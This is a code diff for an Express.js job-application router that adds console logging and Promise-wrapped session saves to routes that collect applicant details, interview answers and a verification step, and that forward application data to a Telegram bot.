@@ -84,6 +84,8 @@ router.get('/', requireSession, (req, res) => {
 
 router.post('/start', requireSession, upload.array('documents', 6), async (req, res) => {
   try {
+    console.log('Starting application for:', req.body.firstName, req.body.lastName);
+    
     const { firstName, lastName, email, phone, coverLetter, position } = req.body;
     req.session.applicationDraft = {
       firstName,
@@ -98,33 +100,49 @@ router.post('/start', requireSession, upload.array('documents', 6), async (req, 
         mimetype: f.mimetype,
       })),
     };
+
     await sendApplicationToTelegram(req.session.applicationDraft);
 
     const normalizedPosition = normalizePosition(position);
     const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
     const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
     req.session.interviewAnswers = null;
-    req.session.save((err) => {
-      if (err) return res.status(500).render('error', { message: 'Session save failed.' });
-      res.render('application-submitted', {
-        questions: selectedQuestions,
-        position,
-        step: 2,
-        isDefault
+
+    // Force session save and wait for completion
+    return new Promise((resolve, reject) => {
+      req.session.save((err) => {
+        if (err) {
+          console.error('Session save error in /start:', err);
+          return res.status(500).render('error', { message: 'Session save failed.' });
+        }
+        console.log('Session saved successfully in /start');
+        res.render('application-submitted', {
+          questions: selectedQuestions,
+          position,
+          step: 2,
+          isDefault
+        });
+        resolve();
       });
     });
   } catch (err) {
-    console.error(err);
+    console.error('Error in /start route:', err);
     res.status(500).render('error', { message: 'Failed to submit application. Please try again later.' });
   }
 });
 
 router.get('/interview', requireSession, (req, res) => {
-  if (!req.session.applicationDraft) return res.redirect('/apply');
+  if (!req.session.applicationDraft) {
+    console.log('No application draft found, redirecting to /apply');
+    return res.redirect('/apply');
+  }
+  
   const pos = req.session.applicationDraft.position;
   const normalizedPosition = normalizePosition(pos);
   const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
   const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
+  
+  console.log('Rendering interview page for position:', pos);
   res.render('application-submitted', {
     questions: selectedQuestions,
     position: pos,
@@ -134,23 +152,43 @@ router.get('/interview', requireSession, (req, res) => {
 });
 
 router.post('/interview', requireSession, express.urlencoded({ extended: true }), async (req, res) => {
-  if (!req.session.applicationDraft) return res.redirect('/apply');
+  if (!req.session.applicationDraft) {
+    console.log('No application draft found, redirecting to /apply');
+    return res.redirect('/apply');
+  }
+  
   const pos = req.session.applicationDraft.position;
   const normalizedPosition = normalizePosition(pos);
   const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
+  
   const interviewAnswers = {};
   selectedQuestions.forEach(q => {
     interviewAnswers[q.name] = req.body[q.name] || '';
   });
+  
   req.session.interviewAnswers = interviewAnswers;
-  req.session.save((err) => {
-    if (err) return res.status(500).render('error', { message: 'Session save failed.' });
-    res.redirect('/apply/info-note');
+  
+  // Force session save and wait for completion
+  return new Promise((resolve, reject) => {
+    req.session.save((err) => {
+      if (err) {
+        console.error('Session save error in /interview:', err);
+        return res.status(500).render('error', { message: 'Session save failed.' });
+      }
+      console.log('Session saved successfully, redirecting to info-note');
+      res.redirect('/apply/info-note');
+      resolve();
+    });
   });
 });
 
 router.get('/info-note', requireSession, (req, res) => {
-  if (!req.session.applicationDraft) return res.redirect('/apply');
+  if (!req.session.applicationDraft) {
+    console.log('No application draft found, redirecting to /apply');
+    return res.redirect('/apply');
+  }
+  
+  console.log('Rendering info-note page');
   res.render('info-note', {
     email: req.session.applicationDraft.email || '',
     position: req.session.applicationDraft.position || ''
@@ -158,7 +196,12 @@ router.get('/info-note', requireSession, (req, res) => {
 });
 
 router.get('/verify', requireSession, (req, res) => {
-  if (!req.session.applicationDraft) return res.redirect('/apply');
+  if (!req.session.applicationDraft) {
+    console.log('No application draft found, redirecting to /apply');
+    return res.redirect('/apply');
+  }
+  
+  console.log('Rendering verify page');
   res.render('verify', {
     email: req.session.applicationDraft.email || '',
     position: req.session.applicationDraft.position || ''
@@ -392,8 +435,7 @@ router.post('/submit', requireSession, async (req, res) => {
   }
 });
 
-// Helpers below...
-
+// Helper functions
 async function sendApplicationToTelegram(data) {
   try {
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
